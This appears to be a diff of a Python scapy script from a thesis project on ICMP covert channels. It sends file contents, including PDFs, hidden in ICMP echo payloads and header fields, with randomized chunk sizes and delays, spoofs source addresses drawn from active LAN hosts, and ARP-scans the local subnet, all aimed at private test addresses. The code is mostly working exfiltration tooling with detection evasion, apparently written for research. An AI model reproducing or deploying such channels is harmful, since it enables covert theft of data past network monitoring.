@@ -3,7 +3,17 @@ from scapy.all import *
 from attacksingleton  import *
 import datetime, ipaddress 
 import re 
-import time 
+import time  
+import math
+from pypdf import PdfReader 
+
+qazwsx=ReceiveSingleton("ipv4_information", True)
+data=qazwsx.wait_data()  
+print("DATA: ",data) 
+print("DATA: ",data.replace("BORGOGNA","")) 
+print("LENGTH: ",len(data)) 
+exit(0)
+
 
 data="echo 'Ciao'".encode() 
 
@@ -247,29 +257,7 @@ def get_tipologia_byte():
         ,11:6 #time_exceeded
         ,3:8 #destination_unreachable
     } 
-#-----------------------------------------------
-
-
-
-def send_data(tipologia:int=None, codice:int=None, data:bytes=None, ip_dst:ipaddress=None): 
-    if not(IS_TYPE.integer(tipologia) and IS_TYPE.integer(codice) and IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst)): 
-        raise Exception("send_data: Argomenti non corretti") 
-    return
-    match tipologia: 
-        case 15: 
-            print("ipv4_information_reply")
-        case 16: print("ipv4_information_reply")
-        case 13: print("ipv4_timestamp_reply")
-        case 14: print("ipv4_timestamp_reply")
-        case 8: print("ipv4_echo_reply")
-        case 0: print("ipv4_echo_reply")
-        case 5: print("ipv4_redirect")
-        case 4: print("ipv4_source_quench")
-        case 12: print("ipv4_parameter_problem")
-        case 11: print("ipv4_time_exceeded")
-        case 3: print("ipv4_destination_unreachable")  
-    return 
-
+#-----------------------------------------------  
 def get_1st_last_4bit(numero:int):
     #Da un byte ricava i primi 4 bit e gli ultimi 4 bit 
     if not IS_TYPE.integer(numero):
@@ -370,7 +358,6 @@ def get_dict_bit_codice():
         return bit_codice 
     
     return get_bit_codice(), get_codice_bit()
-
 
 
 def receive_test_hybrid_channel(ip_dst:ipaddress=None, ip_src:ipaddress=None): 
@@ -593,7 +580,6 @@ def receive_test_hybrid_channel(ip_dst:ipaddress=None, ip_src:ipaddress=None):
     pass 
 
 
-
 def send_test_hybrid_channel(message:bytes=None, ip_dst:ipaddress=None):
     def get_packet(tipologia:int=None, codice:int=None, data:bytes=None, ip_dst:ipaddress=None): 
         if not (IS_TYPE.integer(tipologia) and IS_TYPE.integer(tipologia) and IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst)):
@@ -787,8 +773,7 @@ def send_test_hybrid_channel(message:bytes=None, ip_dst:ipaddress=None):
         
         for tipologia, codice in [primo_messaggio, secondo_messaggio]:
            # print("Tipologia:",tipologia, "Codice:",codice) 
-            num_byte=tipologia_byte[tipologia] 
-            send_data(tipologia, codice, message, ip_dst)  
+            num_byte=tipologia_byte[tipologia]  
             #print("Byte necessari: ",num_byte) 
             if index>=len(message): 
                 #print("L'indice supera la lunghezza della stringa") 
@@ -827,11 +812,234 @@ data=("Dato mandato dal computer di Marco per testare un timing channel a 8 bit"
 #data=("abcdefg"*7).encode() 
 print("Data", data) 
 
-send_test_hybrid_channel(data, ip_dst) 
+#send_test_hybrid_channel(data, ip_dst) 
 #receive_test_hybrid_channel(ip_dst, ip_src) 
 
-#SendSingleton.ipv4_destination_unreachable(data, ip_dst)
+#AttackType.ipv4_destination_unreachable(data, ip_dst)
 
 #snort() { sudo /usr/local/snort/bin/snort --daq-dir /usr/local/lib/daq_s3/lib/daq "$@" }
 
-#source ~/.bashrc
+#source ~/.bashrc 
+
+
+def send_pdf(): 
+    #reader = PdfReader("ACN-GPDP Linee Guida Conservazione Password.pdf") 
+    reader = PdfReader("main.pdf") 
+    
+    destinazione=ipaddress.ip_address("192.168.1.17") 
+    target_mac = IP_INTERFACE.get_macAddress(destinazione).strip().replace("-",":").lower() 
+    interface=IP_INTERFACE.iface_from_IP(destinazione) 
+
+    def sendPage(pageText:str=None, indexPage=0):
+        if pageText is None:
+            return
+        block=150 #dimensione in byte del blocco
+        min_block=32 #byte
+        max_block=64 #byte
+        def test_send1():
+            for i in range(0,len(pageText),block): 
+                sequenza=math.ceil(i/block) 
+                pkt = (
+                    Ether(dst=target_mac)/ IP(dst=destinazione.compressed) 
+                    / ICMP(id=indexPage, seq=sequenza) 
+                    / pageText[i:i+block]
+                )
+                sendp(pkt, verbose=1, iface=interface) 
+                time.sleep(1)
+        def test_send2():
+            send_test_hybrid_channel(
+                message=pageText[i:i+block].encode() 
+                ,ip_dst=destinazione
+            )
+        def test_send3(): 
+            i=0
+            while i<len(pageText): 
+                size=random.randint(min_block,max_block)
+                if (i+size)>len(pageText): 
+                    size=len(pageText)-i
+                pkt = (
+                    Ether(dst=target_mac)/ IP(dst=destinazione.compressed) 
+                    / ICMP(type=8, id=indexPage) 
+                    / pageText[i:i+size]
+                )
+                i+=size
+                sendp(pkt, verbose=1, iface=interface) 
+                time.sleep(random.uniform(1.0,2.0))
+        def test_send4(): 
+            i=0
+            while i<len(pageText): 
+                size=random.randint(min_block,max_block)
+                if (i+size)>len(pageText): 
+                    size=len(pageText)-i 
+                SendSingleton.ipv4_echo_campi_payload(pageText[i:i+size].encode(),destinazione, target_mac, interface) 
+                i+=size 
+                time.sleep(random.uniform(2.0,3.0)) 
+        test_send4()
+
+    #quantita_testo=0
+    #for page in range(len(reader.pages)):
+    #    stringa=reader.pages[page].extract_text() 
+    #    quantita_testo+=len(stringa)
+    #    print("Page {page} is {text}\n\n".format(
+    #        page=page, 
+    #        text=stringa
+    #    ))
+    #    sendPage(stringa, page) 
+        #send_test_hybrid_channel(stringa.encode(), destinazione)
+    #    time.sleep(random.uniform(4.0,5.0)) 
+    #print("La quantità di testo mandato è: ",quantita_testo) 
+
+    path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/ACN-GPDP Linee Guida Conservazione Password.pdf"
+    path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/main.pdf" 
+    with open(path_file, "rb") as file:  
+        print((file.read()[0:64]))
+        SendSingleton.ipv4_echo_campi_payload(
+            file.readline(),
+            destinazione, 
+            target_mac, 
+            interface
+        ) 
+
+def send_pdf2():  
+    path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/ACN-GPDP Linee Guida Conservazione Password.pdf"
+    #path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/main.pdf" 
+    with open(path_file, "rb") as file:  
+        print(len(file.read())) 
+    
+    destinazione=ipaddress.ip_address("192.168.1.17") 
+    target_mac = IP_INTERFACE.get_macAddress(destinazione).strip().replace("-",":").lower() 
+    interface=IP_INTERFACE.iface_from_IP(destinazione) 
+    with open(path_file, "rb") as file: 
+        dato=None 
+        #while dato:=file.read(16384):
+        #while dato:=file.read(4096):
+        while dato:=file.read():
+            SendSingleton.ipv4_echo_campi_payload(
+                dato,
+                destinazione, 
+                target_mac, 
+                interface
+            ) 
+            #time.sleep(random.uniform(300.0,360.0)) #5/6 minuti 
+            #time.sleep(random.uniform(180.0,240.0)) #3/4 minuti 
+            #print("------")
+            #time.sleep(random.uniform(2.0,3.0))  
+
+destinazione=ipaddress.ip_address("192.168.1.74") 
+dato=("abcdefghijklmnopqrstuvwxyz"*1).encode()
+
+un_KB=("BORGOGNA"*128)#.encode()
+print("Dato length:", len(un_KB)) 
+dieci_KB=(un_KB*10)#.encode()
+#print("Dato length:", len(dieci_KB)) 
+cento_KB=(dieci_KB*10)#.encode()
+#print("Dato length:", len(cento_KB)) 
+
+un_MB=(un_KB*1024)#.encode() 
+#print("Dato length:", len(un_MB)) 
+dieci_MB=(un_MB*10)#.encode() 
+#print("Dato length:", len(dieci_MB))
+#cento_MB=(dieci_MB*10)#.encode() 
+#print("Dato length:", len(cento_MB)) 
+
+tipologia=[
+#AttackType.ipv4_destination_unreachable,
+AttackType.ipv4_echo_campi,
+AttackType.ipv4_echo_payload,
+AttackType.ipv4_echo_campi_payload, 
+AttackType.ipv4_echo_random_payload, 
+] 
+
+# Create an ARP request packet 
+
+def prova_fake_sender():
+    cento_KB=(dieci_KB*10)#.encode() 
+    host_attivi, host_inattivi= scan_host_attivi() 
+    print("HOST ATTIVI: ",host_attivi)
+    
+    #USO HOST ATTIVI
+    ip_dst=ipaddress.ip_address("192.168.1.74") 
+    target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
+    interface=IP_INTERFACE.iface_from_IP(ip_dst) 
+    TYPE_ECHO_REQUEST=8
+    TYPE_ECHO_REPLY=0
+    identifier=0 
+    batch_block=1024 
+    for batch in range(0,len(cento_KB),batch_block):  
+        max_block=64 #byte 
+        for index in range(0,len(data),max_block): 
+            host_scelto=random.choice(host_attivi) 
+            pkt = (
+                Ether(dst=target_mac)/ IP(src=ipaddress.ip_address(host_scelto).compressed, dst=ip_dst.compressed) 
+                / ICMP(type=TYPE_ECHO_REPLY,id=identifier, seq=0) 
+                / data[index:index+max_block]
+                )
+            sendp(pkt, verbose=1, iface=interface)
+        identifier+=1 
+        print("Waiting...")
+        time.sleep(random.uniform(1,10)) 
+
+
+destinazione=ipaddress.ip_address("192.168.1.74") 
+tempo_inizio=datetime.datetime.now() 
+sleep_time=60*60 #15 min
+ripetizioni=3 
+cento_KB=(dieci_KB*10)#.encode() 
+un_MB=(un_KB*1024)#.encode() 
+for index in range(ripetizioni):
+    SendSingleton.send_data(
+        True, 
+        False, 
+        #AttackType.ipv4_echo_payload, 
+        AttackType.ipv4_echo_random_payload, 
+        un_MB.encode(),
+        destinazione
+    ) 
+    tempo_fine=datetime.datetime.now()
+    print("Tempo di invio:", tempo_fine-tempo_inizio)
+    if index!=ripetizioni-1: 
+        print(f"{index}o tempo di invio:", datetime.datetime.now()) 
+        non_blocking_sleep(sleep_time) 
+exit(0)
+
+start_time=datetime.now()
+for i in range(1): 
+    time.sleep(17.5)
+    send_pdf2() 
+    print("--------")
+    #1h=60 min=3600 sec
+    time.sleep(3600)
+    
+print("Excec time: ",datetime.now()- start_time) 
+
+#Excec time:  0:00:34.737922
+#35 secondi
+
+#Con wait di 3 secondi
+#Excec time:  0:19:39.998772
+
+
+
+
+#active_host, inactive_host=scan_host_attivi() 
+#print("Active:",active_host) 
+#print("Inactive:",inactive_host) 
+
+
+#print("------")
+#print(conf.iface)
+#print(conf.route.route("0.0.0.0")[2])
+#print(conf.route.route("0.0.0.0")[1])
+#print((conf.route.route("0.0.0.0")[1]).rsplit(".",1)[0]+"0/24") 
+
+for index in range(256):
+    if index==0 or index==255: 
+        continue 
+    print(f"Index: {index}")
+    arp_request = ARP(pdst=f"192.168.1.{index}")
+    # Send the ARP request packet
+    #send(arp_request) 
+    response=sr1(arp_request) 
+    if response:
+        print(response)
+exit(0)
